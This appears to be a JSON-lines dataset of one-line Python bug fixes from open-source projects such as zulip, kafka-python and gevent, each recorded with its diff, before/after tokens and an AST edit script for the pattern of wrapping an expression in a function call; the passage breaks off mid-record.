{"project": "zulip", "commit_sha": "a53240a47c41a573ce91324ebeeb40fb1532e99f", "parent_sha": "5050e422122b974110c6b5377decdc5a17226ff1", "file_path": "zerver/tests/test_subs.py", "project_url": "https://github.com/punit-agarwal/zulip", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1854,7 +1854,7 @@ class SubscriptionAPITest(ZulipTestCase):\n-        self.assertGreaterEqual(self.streams, 2)\n+        self.assertGreaterEqual(len(self.streams), 2)\n         streams_to_remove = self.streams[1:]\n         not_subbed = []\n         for stream in Stream.objects.all():\n", "before": "self . assertGreaterEqual ( self . streams , 2 )", "after": "self . assertGreaterEqual ( len ( self . streams ) , 2 )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 0, 32, 0, 49], [\"call\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:len\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"attribute\", 0, 33, 0, 45], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "zulip", "commit_sha": "a6caf30ca7e5d2bdd7a62657653bcfe285fab70e", "parent_sha": "f010ed117bb50b0470b4475d2484a25cd5bee034", "file_path": "scripts/lib/zulip_tools.py", "project_url": "https://github.com/punit-agarwal/zulip", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -189,7 +189,7 @@ def get_recent_deployments(threshold_days):\n     recent = set()\n     threshold_date = datetime.datetime.now() - datetime.timedelta(days=threshold_days)\n     for dir_name in os.listdir(DEPLOYMENTS_DIR):\n-        if not os.path.isdir(dir_name):\n+        if not os.path.isdir(os.path.join(DEPLOYMENTS_DIR, dir_name)):\n             # Skip things like uwsgi sockets.\n             continue\n         try:\n", "before": "if not os . path . isdir ( dir_name ) : continue", "after": "if not os . path . isdir ( os . path . join ( DEPLOYMENTS_DIR , dir_name ) ) : continue", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 29, 3, 39], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 29, 3, 39], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N1\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:join\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"identifier:DEPLOYMENTS_DIR\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Move\", \"N2\", [\"identifier:dir_name\", 3, 30, 3, 38], 3], [\"Move\", \"N2\", [\"):)\", 3, 38, 3, 39], 4], [\"Insert\", \"N3\", [\"identifier:os\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:path\", \"T\"], 2]]"}
{"project": "jip", "commit_sha": "8c73247fd21ce907187ac39d3dbe2a6ed7d5c814", "parent_sha": "5087b5803a4541e129cd38a8cc1c7a8761ee5688", "file_path": "jip/main.py", "project_url": "https://github.com/debugger87/jip", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -50,7 +50,7 @@ def main():\n     args = vars(parser.parse_args())\n     cmd = args.pop('command')\n     options = {}\n-    for k in args.keys():\n+    for k in list(args.keys()):\n         if k.startswith('options.'):\n             v = args.pop(k)\n             k = k[k.index('.')+1:]\n", "before": "for k in args . keys ( ) : if k . startswith ( 'options.' ) : v = args . pop ( k ) k = k [ k . index ( '.' ) + 1 : ]", "after": "for k in list ( args . keys ( ) ) : if k . startswith ( 'options.' ) : v = args . pop ( k ) k = k [ k . index ( '.' ) + 1 : ]", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 14, 3, 25], [\"identifier:list\", \"T\"], 0], [\"Insert\", [\"call\", 3, 14, 3, 25], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 14, 3, 25], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "kafka-python", "commit_sha": "103ac7eb11071395fb566495a4c1e0eb62482263", "parent_sha": "07e09c1c2ec6787fc7e4f3c2578d31b4a15d20bc", "file_path": "kafka/consumer/fetcher.py", "project_url": "https://github.com/DataDog/kafka-python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -236,7 +236,7 @@ class Fetcher(six.Iterator):\n         current_out_of_range_partitions = {}\n \n         # filter only the fetchable partitions\n-        for partition, offset in self._offset_out_of_range_partitions:\n+        for partition, offset in six.iteritems(self._offset_out_of_range_partitions):\n             if not self._subscriptions.is_fetchable(partition):\n                 log.debug(\"Ignoring fetched records for %s since it is no\"\n                           \" longer fetchable\", partition)\n", "before": "for partition , offset in self . _offset_out_of_range_partitions : if not self . _subscriptions . is_fetchable ( partition ) : log . debug ( \"Ignoring fetched records for %s since it is no\" \" longer fetchable\" , partition )", "after": "for partition , offset in six . iteritems ( self . _offset_out_of_range_partitions ) : if not self . _subscriptions . is_fetchable ( partition ) : log . debug ( \"Ignoring fetched records for %s since it is no\" \" longer fetchable\" , partition )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"for_statement\", 3, 9, 6, 58], [\"call\", \"N0\"], 3], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N1\", [\"identifier:six\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:iteritems\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Move\", \"N2\", [\"attribute\", 3, 34, 3, 70], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2]]"}
{"project": "kafka-python", "commit_sha": "ce1bdee2ecda6279f062e1bdafa07fbbf747845e", "parent_sha": "641b6399d89687721e7a88524d6ed288a43ce8ad", "file_path": "kafka/consumer/subscription_state.py", "project_url": "https://github.com/DataDog/kafka-python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -225,7 +225,7 @@ class SubscriptionState(object):\n \n         for tp in assignments:\n             if tp.topic not in self.subscription:\n-                raise ValueError(\"Assigned partition %s for non-subscribed topic.\" % tp)\n+                raise ValueError(\"Assigned partition %s for non-subscribed topic.\" % str(tp))\n         self.assignment.clear()\n         for tp in assignments:\n             self._add_assigned_partition(tp)\n", "before": "raise ValueError ( \"Assigned partition %s for non-subscribed topic.\" % tp )", "after": "raise ValueError ( \"Assigned partition %s for non-subscribed topic.\" % str ( tp ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 34, 3, 88], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:str\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:tp\", 3, 86, 3, 88], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "curator", "commit_sha": "3579ee4cc6fb68572343f80d7a06dd4cfa0392ad", "parent_sha": "2768aa6667bb835068cc8908bf622f95cb16622e", "file_path": "curator/curator.py", "project_url": "https://github.com/mgmonteleone/curator", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -197,7 +197,7 @@ def get_indices(client, prefix='logstash-', exclude_pattern=None):\n     _indices = sorted(client.indices.get_settings(index=prefix+'*', params={'expand_wildcards': 'closed'}).keys())\n     if exclude_pattern:\n         pattern = re.compile(exclude_pattern)\n-        return filter(lambda x: not pattern.search(x), _indices)\n+        return list(filter(lambda x: not pattern.search(x), _indices))\n     else:\n         return _indices\n", "before": "return filter ( lambda x : not pattern . search ( x ) , _indices )", "after": "return list ( filter ( lambda x : not pattern . search ( x ) , _indices ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 16, 3, 65], [\"identifier:list\", \"T\"], 0], [\"Insert\", [\"call\", 3, 16, 3, 65], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 16, 3, 65], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "curator", "commit_sha": "567b69cf577df44ee80a1bdeffb3746ca6d26ab3", "parent_sha": "71cc032b8b2892147ac00e1e43b76c8979aad3b3", "file_path": "test_curator/integration/test_repo_mgr.py", "project_url": "https://github.com/mgmonteleone/curator", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -10,7 +10,7 @@ class TestRepoMgr(CuratorTestCase):\n         es_repo_mgr._create_repository(self.client, repository=self.args['repository'], repo_type='fs', location=self.args['location'])\n         pre = es_repo_mgr.get_repository(self.client, self.args['repository'])\n         self.assertEqual('fs', pre[self.args['repository']]['type'])\n-        self.assertEqual(self.args['repository'], pre.keys()[0])\n+        self.assertEqual(self.args['repository'], list(pre.keys())[0])\n         es_repo_mgr._delete_repository(self.client, repository=self.args['repository'])\n         post = es_repo_mgr.get_repository(self.client, self.args['repository'])\n         self.assertEqual(None, post)\n", "before": "self . assertEqual ( self . args [ 'repository' ] , pre . keys ( ) [ 0 ] )", "after": "self . assertEqual ( self . args [ 'repository' ] , list ( pre . keys ( ) ) [ 0 ] )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 51, 3, 61], [\"identifier:list\", \"T\"], 0], [\"Insert\", [\"call\", 3, 51, 3, 61], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 51, 3, 61], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "TAMProxy-pyHost", "commit_sha": "6d1895790d025ba29225e7a84536a9b0bd6d2946", "parent_sha": "818cf45fae0508f5f0c6646871d8b9d8001f1b11", "file_path": "tamproxy/devices/odometer.py", "project_url": "https://github.com/skrub-wreckers/TAMProxy-pyHost", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -16,7 +16,7 @@ class Odometer(ContinuousReadDevice):\n         self.right_enc = right_enc\n         self.gyro = gyro\n         self.alpha = alpha\n-        self.val = 0\n+        self.val = self.Reading(0, 0, 0)\n         super(Odometer, self).__init__(tamproxy, continuous=False)\n \n     def __repr__(self):\n", "before": "self . val = 0", "after": "self . val = self . Reading ( 0 , 0 , 0 )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 21], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N1\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:Reading\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Move\", \"N2\", [\"integer:0\", 3, 20, 3, 21], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"integer:0\", \"T\"], 3], [\"Insert\", \"N2\", [\",:,\", \"T\"], 4], [\"Insert\", \"N2\", [\"integer:0\", \"T\"], 5], [\"Insert\", \"N2\", [\"):)\", \"T\"], 6]]"}
{"project": "lesswrong", "commit_sha": "77aa4ac80569de45b83c9b7cce2c45d423048fad", "parent_sha": "0d70b2159fdaef679225bf56db9028f7a06ed1b1", "file_path": "r2/r2/lib/filters.py", "project_url": "https://github.com/jimrandomh/lesswrong", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -190,7 +190,7 @@ def unkeep_space(text):\n \n whitespace_re = re.compile('^\\s*$')\n def killhtml(html=''):\n-    html_doc = soupparser.fromstring(html)\n+    html_doc = soupparser.fromstring(remove_control_chars(html))\n     text = filter(lambda text: not whitespace_re.match(text), html_doc.itertext())\n     cleaned_html = ' '.join([fragment.strip() for fragment in text])\n     return cleaned_html\n", "before": "html_doc = soupparser . fromstring ( html )", "after": "html_doc = soupparser . fromstring ( remove_control_chars ( html ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 37, 3, 43], [\"(:(\", \"T\"], 0], [\"Insert\", [\"argument_list\", 3, 37, 3, 43], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 37, 3, 43], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"identifier:remove_control_chars\", \"T\"], 0], [\"Move\", \"N0\", [\"argument_list\", 3, 37, 3, 43], 1]]"}
{"project": "script.skin.helper.service", "commit_sha": "31cf544f30b9f7132d8ce85080eab976ffe9d7dd", "parent_sha": "8fcf38bd031233e62086fc5bd685c269d947b564", "file_path": "resources/lib/ListItemMonitor.py", "project_url": "https://github.com/mgonzales71/script.skin.helper.service", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -412,7 +412,7 @@ class ListItemMonitor(threading.Thread):\n     def setWindowProp(self,key,value):\n         if not key in self.allWindowProps:\n             self.allWindowProps.append(key)\n-        WINDOW.setProperty(key,value)\n+        WINDOW.setProperty(key,try_encode(value))\n     \n     def setMovieSetDetails(self):\n         #get movie set details -- thanks to phil65 - used this idea from his skin info script\n", "before": "WINDOW . setProperty ( key , value )", "after": "WINDOW . setProperty ( key , try_encode ( value ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 27, 3, 38], [\"call\", \"N0\"], 3], [\"Insert\", [\"argument_list\", 3, 27, 3, 38], [\"):)\", \"T\"], 4], [\"Insert\", \"N0\", [\"identifier:try_encode\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:value\", 3, 32, 3, 37], 1], [\"Move\", \"N1\", [\"):)\", 3, 37, 3, 38], 2]]"}
{"project": "kitsune", "commit_sha": "65f276f2f223d40332b3798983329653bf0dc494", "parent_sha": "3cb3c692048ea8af60f72f4ff281ac8dba48d37b", "file_path": "kitsune/questions/views.py", "project_url": "https://github.com/skcrouch7/kitsune", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -827,7 +827,7 @@ def solve(request, question_id, answer_id):\n \n     question.solution = answer\n     question.save()\n-    question.add_metadata(solver_id=request.user.id)\n+    question.add_metadata(solver_id=str(request.user.id))\n \n     statsd.incr('questions.solution')\n     QuestionSolvedEvent(answer).fire(exclude=question.creator)\n", "before": "question . add_metadata ( solver_id = request . user . id )", "after": "question . add_metadata ( solver_id = str ( request . user . id ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 27, 3, 52], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:str\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"attribute\", 3, 37, 3, 52], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "kitsune", "commit_sha": "a417866cc942b3a077a092134c59948a60f40c47", "parent_sha": "a5dbbd53da8efd87257b9db4d499de4b78848f41", "file_path": "kitsune/questions/models.py", "project_url": "https://github.com/skcrouch7/kitsune", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1027,7 +1027,7 @@ def reindex_questions_answers(sender, instance, **kw):\n     if instance.id:\n         answer_ids = instance.answers.all().values_list('id', flat=True)\n-        index_task.delay(AnswerMetricsMappingType, answer_ids)\n+        index_task.delay(AnswerMetricsMappingType, list(answer_ids))\n \n post_save.connect(\n     reindex_questions_answers, sender=Question,\n", "before": "index_task . delay ( AnswerMetricsMappingType , answer_ids )", "after": "index_task . delay ( AnswerMetricsMappingType , list ( answer_ids ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 2, 25, 2, 63], [\"call\", \"N0\"], 3], [\"Insert\", [\"argument_list\", 2, 25, 2, 63], [\"):)\", \"T\"], 4], [\"Insert\", \"N0\", [\"identifier:list\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:answer_ids\", 2, 52, 2, 62], 1], [\"Move\", \"N1\", [\"):)\", 2, 62, 2, 63], 2]]"}
{"project": "script.skin.helper.service", "commit_sha": "834988563003b8c44401593bc37547b7ec377d76", "parent_sha": "a8a654acb501b10cca92e97b40a82c22cb3f68c5", "file_path": "plugin.py", "project_url": "https://github.com/mgonzales71/script.skin.helper.service", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -68,7 +68,7 @@ class Main:\n                 elif action == \"WIDGETS\":\n                     getWidgets(path)\n                 elif action == \"GETTHUMB\":\n-                    getThumb(path)\n+                    getThumb(try_decode(path))\n                 elif action == \"WIDGETS\":\n                     getWidgets(path)\n                 elif action == \"GETCAST\":\n", "before": "elif action == \"GETTHUMB\" : getThumb ( path )", "after": "elif action == \"GETTHUMB\" : getThumb ( try_decode ( path ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 29, 3, 35], [\"(:(\", \"T\"], 0], [\"Insert\", [\"argument_list\", 3, 29, 3, 35], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 29, 3, 35], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"identifier:try_decode\", \"T\"], 0], [\"Move\", \"N0\", [\"argument_list\", 3, 29, 3, 35], 1]]"}
{"project": "salt", "commit_sha": "6b930ac7aa19a48775d4c6addb8d7a7dd9d7e76d", "parent_sha": "80a99c4cc55e7eb492bfa2453eab6de543ac0dfe", "file_path": "salt/states/boto_secgroup.py", "project_url": "https://github.com/kraney/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -326,7 +326,7 @@ def _get_rule_changes(rules, _rules):\n     # 2. determine if rule exists in existing security group rules\n     for rule in rules:\n         try:\n-            ip_protocol = rule.get('ip_protocol')\n+            ip_protocol = str(rule.get('ip_protocol'))\n         except KeyError:\n             raise SaltInvocationError('ip_protocol, to_port, and from_port are'\n                                       ' required arguments for security group'\n", "before": "ip_protocol = rule . get ( 'ip_protocol' )", "after": "ip_protocol = str ( rule . get ( 'ip_protocol' ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 27, 3, 50], [\"identifier:str\", \"T\"], 0], [\"Insert\", [\"call\", 3, 27, 3, 50], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 27, 3, 50], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "armstrong.esi", "commit_sha": "53c319a8b9d1853e57b339b9023cce1db4ef3cb0", "parent_sha": "bb24b4e4369732be4869b50545bcd71af785b787", "file_path": "armstrong/esi/templatetags/esi.py", "project_url": "https://github.com/texastribune/armstrong.esi", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -12,7 +12,7 @@ class EsiTemplateTagError(Exception):\n class EsiNode(URLNode):\n     def __init__(self, *args, **kwargs):\n         super(EsiNode, self).__init__(*args, **kwargs)\n-        if '/' in self.view_name:\n+        if '/' in str(self.view_name):\n             # An actual URL has been passed instead of a view name.\n             self.raw_url = self.view_name\n             self.view_name = None\n", "before": "if '/' in self . view_name : self . raw_url = self . view_name self . view_name = None", "after": "if '/' in str ( self . view_name ) : self . raw_url = self . view_name self . view_name = None", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 33], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:str\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"attribute\", 3, 19, 3, 33], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "gevent", "commit_sha": "9f4f994ffbf20d10f93035f4c0a9af702694a597", "parent_sha": "793103595d2166c7dd7c1f51b70e78622cfe73de", "file_path": "greentest/test___monkey_patching.py", "project_url": "https://github.com/gevent/gevent", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -35,7 +35,7 @@ def TESTRUNNER(tests=None):\n \n def main():\n     import testrunner\n-    return testrunner.run_many(TESTRUNNER(sys.argv[1:]))\n+    return testrunner.run_many(list(TESTRUNNER(sys.argv[1:])))\n \n \n if __name__ == '__main__':\n", "before": "return testrunner . run_many ( TESTRUNNER ( sys . argv [ 1 : ] ) )", "after": "return testrunner . run_many ( list ( TESTRUNNER ( sys . argv [ 1 : ] ) ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 32, 3, 56], [\"identifier:list\", \"T\"], 0], [\"Insert\", [\"call\", 3, 32, 3, 56], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 32, 3, 56], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "amepah", "commit_sha": "def5c27cbf203247a27ab1a3bc748b1f26d7392c", "parent_sha": "bfa8d62b5ad0aef70e78d2351cd3a71af6fa2410", "file_path": "spline_calibration.py", "project_url": "https://github.com/berkelem/amepah", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -327,7 +327,7 @@ class Coadder:\n                 self.all_uncs[px].append(orbit_uncs[p])\n \n     def clean_data(self):\n-        for p, px_list in self.all_data:\n+        for p, px_list in enumerate(self.all_data):\n             unc_list = self.all_uncs[p]\n             z = np.abs(stats.zscore(px_list))\n             mask = z > 1\n", "before": "for p , px_list in self . all_data : unc_list = self . all_uncs [ p ] z = np . abs ( stats . zscore ( px_list ) ) mask = z > 1", "after": "for p , px_list in enumerate ( self . all_data ) : unc_list = self . all_uncs [ p ] z = np . abs ( stats . zscore ( px_list ) ) mask = z > 1", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"for_statement\", 3, 9, 6, 25], [\"call\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:enumerate\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"attribute\", 3, 27, 3, 40], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "gevent", "commit_sha": "660d52b8a0f419476e78b96b05c63862d82c1797", "parent_sha": "8c032c01645c94735a0a6b54071aa82f484b04f6", "file_path": "util/cythonpp.py", "project_url": "https://github.com/gevent/gevent", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -914,7 +914,7 @@ def run_cython(filename, sourcehash, output_filename, banner, comment, cache=Non\n     result = cache.get(sourcehash) if cache is not None else None\n     # Use an array for the argument so that filename arguments are properly\n     # quoted according to local convention\n-    command = [CYTHON, '-o', output_filename, '-I', 'gevent', filename]\n+    command = [CYTHON, '-o', output_filename, '-I', os.path.join('src', 'gevent'), filename]\n     if result is not None:\n         log('Reusing %s  # %s', command, comment)\n         return result\n", "before": "command = [ CYTHON , '-o' , output_filename , '-I' , 'gevent' , filename ]", "after": "command = [ CYTHON , '-o' , output_filename , '-I' , os . path . join ( 'src' , 'gevent' ) , filename ]", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"list\", 3, 15, 3, 72], [\"call\", \"N0\"], 9], [\"Insert\", [\"list\", 3, 15, 3, 72], [\",:,\", \"T\"], 10], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N1\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:join\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'src'\", \"T\"], 1], [\"Move\", \"N2\", [\",:,\", 3, 61, 3, 62], 2], [\"Move\", \"N2\", [\"string:'gevent'\", 3, 53, 3, 61], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4], [\"Insert\", \"N3\", [\"identifier:os\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:path\", \"T\"], 2]]"}
{"project": "gevent", "commit_sha": "13057d8396b664ce9febb7f1802efb49d5270f29", "parent_sha": "3718930b24bce3ec3a54ff22a57cca16b4766bef", "file_path": "greentest/testrunner.py", "project_url": "https://github.com/gevent/gevent", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -89,7 +89,7 @@ def run_many(tests, expected=None, failfast=False):\n \n     if NWORKERS > 1 and toretry:\n         util.log('\\nWill retry %s failed tests sequentially:\\n- %s\\n', len(toretry), '\\n- '.join(toretry))\n-        for name, (cmd, kwargs, _ignore) in failed.items():\n+        for name, (cmd, kwargs, _ignore) in list(failed.items()):\n             if not util.run(cmd, buffer_output=False, **kwargs):\n                 failed.pop(name)\n                 failed_then_succeeded.append(name)\n", "before": "for name , ( cmd , kwargs , _ignore ) in failed . items ( ) : if not util . run ( cmd , buffer_output = False , ** kwargs ) : failed . pop ( name ) failed_then_succeeded . append ( name )", "after": "for name , ( cmd , kwargs , _ignore ) in list ( failed . items ( ) ) : if not util . run ( cmd , buffer_output = False , ** kwargs ) : failed . pop ( name ) failed_then_succeeded . append ( name )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 45, 3, 59], [\"identifier:list\", \"T\"], 0], [\"Insert\", [\"call\", 3, 45, 3, 59], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 45, 3, 59], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "spiderfoot", "commit_sha": "1aa29f050f88ca7020d32aae6de34cd301a7f7d0", "parent_sha": "2eff1b33e2f1c898db25615a55a5fc636d5d46fc", "file_path": "modules/sfp_flickr.py", "project_url": "https://github.com/smicallef/spiderfoot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -146,7 +146,7 @@ class sfp_flickr(SpiderFootPlugin):\n \n             # Extract emails\n             for photo in data['photos']['photo']:\n-                emails = self.sf.parseEmails(str(photo).decode('unicode-escape'))\n+                emails = self.sf.parseEmails(bytes(str(photo), \"ascii\").decode('unicode-escape'))\n                 for email in emails:\n                     # Skip unrelated emails\n                     mailDom = email.lower().split('@')[1]\n", "before": "emails = self . sf . parseEmails ( str ( photo ) . decode ( 'unicode-escape' ) )", "after": "emails = self . sf . parseEmails ( bytes ( str ( photo ) , \"ascii\" ) . decode ( 'unicode-escape' ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 46, 3, 56], [\"identifier:bytes\", \"T\"], 0], [\"Insert\", [\"call\", 3, 46, 3, 56], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 46, 3, 56], 1], [\"Insert\", \"N0\", [\",:,\", \"T\"], 2], [\"Insert\", \"N0\", [\"string:\\\"ascii\\\"\", \"T\"], 3], [\"Insert\", \"N0\", [\"):)\", \"T\"], 4]]"}
{"project": "pritunl", "commit_sha": "b86f3094d2f5d7191893d2b35d3f5a479f22e677", "parent_sha": "d0704761c1f9980af09b4ce95cc68bdaadb781f1", "file_path": "pritunl/utils/misc.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -53,7 +53,7 @@ def filter_str(in_str):\n def filter_id(in_id):\n     if not in_id:\n         return in_id\n-    return ''.join(x for x in in_id if x.isalnum())\n+    return ''.join(x for x in str(in_id) if x.isalnum())\n \n def get_cert_block(cert_data):\n     start_index = cert_data.index('-----BEGIN CERTIFICATE-----')\n", "before": "return '' . join ( x for x in in_id if x . isalnum ( ) )", "after": "return '' . join ( x for x in str ( in_id ) if x . isalnum ( ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"for_in_clause\", 3, 22, 3, 36], [\"call\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:str\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", 